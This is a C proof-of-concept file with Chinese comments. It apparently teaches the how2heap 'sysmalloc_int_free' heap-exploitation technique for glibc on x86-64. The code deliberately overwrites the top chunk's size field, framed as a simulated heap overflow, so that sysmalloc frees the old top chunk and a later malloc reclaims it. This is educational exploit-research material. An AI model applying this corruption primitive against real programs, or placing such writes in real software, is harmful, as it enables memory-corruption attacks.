#define _GNU_SOURCE

#include <assert.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*
 * 本文件面向 glibc 2.23～2.43 / x86-64，展示如何让 sysmalloc 间接释放旧 top。
 *
 * 思路借鉴自 how2heap 的 sysmalloc_int_free，这里改写成带完整中文步骤说明的
 * 版本。为了让流程可控，PoC 直接改写 top.size，用它模拟题目里常见的
 * heap overflow / 越界写场景。
 */

#define SIZE_SZ            (sizeof(size_t))
#define CHUNK_HEADER_SIZE  (2 * SIZE_SZ)
#define MALLOC_ALIGNMENT   0x10UL
#define ALIGN_DOWN(value)  ((value) & ~(MALLOC_ALIGNMENT - 1))

/* sysmalloc 会在旧 top 尾部留下两份 chunk header，充当阻止跨区域合并的 fencepost。 */
#define FENCEPOST_BYTES    (2 * CHUNK_HEADER_SIZE)

/* 这是我们希望 sysmalloc 最终交给 _int_free 处理的物理 chunk 大小。 */
#define FREED_CHUNK_SIZE   0x150UL
#define FREED_REQUEST      (FREED_CHUNK_SIZE - CHUNK_HEADER_SIZE)

int main(void)
{
    long page_size;
    size_t page_mask;
    size_t first_top_size;
    size_t padding_request;
    size_t forged_top_size;
    size_t expected_freed_size;
    size_t *top_size_field;
    unsigned char *probe;
    unsigned char *padding;
    unsigned char *high_allocation;
    unsigned char *reclaimed;

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    page_size = sysconf(_SC_PAGESIZE);
    assert(page_size > 0 && (page_size & (page_size - 1)) == 0);
    page_mask = (size_t)page_size - 1;
    assert((FREED_CHUNK_SIZE & (MALLOC_ALIGNMENT - 1)) == 0);

    /*
     * malloc(0x10) 对应的物理 size 是 0x20。用户区之后紧跟的一个 size_t 正是
     * 当前 top.size，所以 probe[3]（以 size_t 为单位数）就能读到它。这只是
     * 教学用的探测手段，帮助我们确认当前 top 的真实大小。
     */
    probe = malloc(0x10);
    assert(probe != NULL);
    first_top_size = ((size_t *)probe)[3];

    /*
     * 接下来消耗掉一部分 top，目标是让下一块 top 的真实末端恰好落在页面
     * 边界上，并让它的低位大小能被缩成 0x170：即 0x20 的 fencepost 加上
     * 0x150 待释放的 chunk。
     */
    padding_request = first_top_size
                    - CHUNK_HEADER_SIZE
                    - (2 * MALLOC_ALIGNMENT)
                    - FREED_CHUNK_SIZE;
    padding_request &= page_mask;
    padding_request = ALIGN_DOWN(padding_request);
    assert(padding_request >= MALLOC_ALIGNMENT);

    padding = malloc(padding_request);
    assert(padding != NULL);

    /* padding 之后紧接着就是 top，其末尾考虑对齐后的一个 size_t 就是 top.size。 */
    top_size_field = (size_t *)(padding + padding_request
                               - SIZE_SZ + MALLOC_ALIGNMENT);
    first_top_size = *top_size_field;

    /*
     * 漏洞点：这里只保留当前 top.size 在页面内的低位部分。
     * size 字段本身带 PREV_INUSE 位，因此通常会得到 0x181，对应的物理大小是 0x180。
     */
    forged_top_size = first_top_size & page_mask;
    *top_size_field = forged_top_size;

    expected_freed_size = ALIGN_DOWN(forged_top_size - FENCEPOST_BYTES);
    assert(expected_freed_size == FREED_CHUNK_SIZE);

    /*
     * 发起一个超过伪造后 top 剩余空间的请求，逼迫 _int_malloc 进入 sysmalloc。
     * 新的内存区域会分配在更高地址；旧 top 扣掉 fencepost 之后就会被 _int_free 释放。
     */
    high_allocation = malloc(FREED_CHUNK_SIZE + 0x10);
    assert(high_allocation != NULL);

    /* 再申请 0x140，理应从刚被释放的 0x150 旧 top chunk 那里拿回一个低地址。 */
    reclaimed = malloc(FREED_REQUEST);
    assert(reclaimed != NULL);
    assert(reclaimed < high_allocation);

    puts("[+] sysmalloc：旧 top 已释放");
    return 0;
}
